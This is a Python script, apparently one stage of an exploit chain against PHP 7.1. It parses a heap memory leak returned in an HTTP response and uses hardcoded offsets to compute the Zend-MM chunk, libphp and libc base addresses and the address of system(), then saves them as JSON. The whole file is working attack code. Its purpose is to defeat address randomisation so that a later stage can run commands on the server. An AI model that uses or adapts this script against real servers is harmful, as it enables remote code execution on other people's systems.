#!/usr/bin/env python3
"""Derive the PHP 7.1 heap/libphp/libc addresses from the B1 HTTP body only."""

from __future__ import annotations

import argparse
import collections
import json
import struct
from pathlib import Path


MAIN_SLOT = 0x14F108
DTOR_OFFSET = 0x3D7CE0
LIBC_FROM_LIBPHP = 0x21EC000
SYSTEM_OFFSET = 0x449C0


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("leak", type=Path)
    parser.add_argument("--output", required=True, type=Path)
    args = parser.parse_args()
    leak = args.leak.read_bytes()
    if len(leak) != 0x400000 or leak[:8] != b"/12BBBBB":
        raise SystemExit("unexpected PHP 7.1 B1 leak geometry")

    main_pointer = struct.unpack_from("<Q", leak, MAIN_SLOT)[0]
    if main_pointer & 0x1FFFFF != 0x40:
        raise SystemExit("main pointer did not identify a 2 MiB Zend-MM chunk")
    main_chunk = main_pointer - 0x40

    qwords = collections.Counter(
        struct.unpack_from("<Q", leak, offset)[0]
        for offset in range(0, len(leak) - 7, 8)
    )
    candidates = []
    for pointer, hits in qwords.items():
        libphp = pointer - DTOR_OFFSET
        if hits >= 2000 and pointer < (1 << 63) and libphp > 0 and libphp & 0xFFF == 0:
            candidates.append((hits, pointer, libphp))
    if len(candidates) != 1:
        rendered = [(hits, hex(pointer), hex(base)) for hits, pointer, base in candidates]
        raise SystemExit(f"ambiguous destructor candidates: {rendered}")
    hits, dtor, libphp = candidates[0]
    libc = libphp + LIBC_FROM_LIBPHP
    system = libc + SYSTEM_OFFSET
    result = {
        "address_source": "http-b1",
        "leak_length": len(leak),
        "main_slot": hex(MAIN_SLOT),
        "main_pointer": hex(main_pointer),
        "main_chunk": hex(main_chunk),
        "dtor_pointer": hex(dtor),
        "dtor_hits": hits,
        "dtor_offset": hex(DTOR_OFFSET),
        "libphp_base": hex(libphp),
        "libc_from_libphp": hex(LIBC_FROM_LIBPHP),
        "libc_base": hex(libc),
        "system_offset": hex(SYSTEM_OFFSET),
        "system": hex(system),
    }
    args.output.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(result, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
